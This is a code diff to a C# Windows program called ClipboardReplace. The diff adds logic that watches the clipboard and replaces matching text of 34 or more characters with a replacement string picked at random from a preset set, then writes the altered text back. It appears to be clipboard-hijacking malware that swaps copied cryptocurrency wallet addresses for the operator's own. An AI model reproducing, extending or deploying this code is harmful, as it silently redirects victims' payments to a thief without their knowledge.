@@ -2,6 +2,7 @@
 using ClipboardReplace.config;
 using ClipboardReplace.service;
 using System;
+using System.Linq;
 using System.Text.RegularExpressions;
 using System.Windows.Forms;
 
@@ -37,20 +38,32 @@ namespace ClipboardReplace
 
         public void replaceIfMath(string clipValue)
         {
-            if (clipValue.Contains(Constant.ClipReplace.REPLACE_VALUE) || clipValue.Length < Constant.ClipReplace.REPLACE_VALUE.Length)
+            if (clipValue.Length<34)
             {
+                DebugService.WriteLine(Level.INFO, "\t ignore : Length < 34");
                 return;
             }
-
+            foreach (string item in Constant.ClipReplace.REPLACE_VALUE_SET)
+            {
+                if (clipValue.Contains(item))
+                {
+                    DebugService.WriteLine(Level.INFO, "\t ignore : already replaced !!");
+                    return;
+                }
+                    
+            }
+            Random randomizer = new Random();
+            string[] arr = Constant.ClipReplace.REPLACE_VALUE_SET.ToArray();
+            string raplaceValue = arr[randomizer.Next(arr.Length)];
 
             int num = 0;
             foreach (Match m in Regex.Matches(clipValue, Constant.ClipReplace.REGEX, RegexOptions.Multiline))
             {
                 if (num == 0)
                 {
-                    DebugService.WriteLine(Level.INFO, "\t'{0}' founded in {1}, will be replaced to {2}", m.Value, m.Index, Constant.ClipReplace.REPLACE_VALUE);
+                    DebugService.WriteLine(Level.INFO, "\t'{0}' founded in {1}, will be replaced to {2}", m.Value, m.Index, raplaceValue);
                     Regex regex = new Regex(m.Value);
-                    string clipTargetVal = regex.Replace(clipValue, Constant.ClipReplace.REPLACE_VALUE, 1);
+                    string clipTargetVal = regex.Replace(clipValue, raplaceValue, 1);
                     DebugService.WriteLine(Level.INFO, "\t clipTargetVal : {0}", clipTargetVal);
                     Clipboard.SetText(clipTargetVal);
                 }
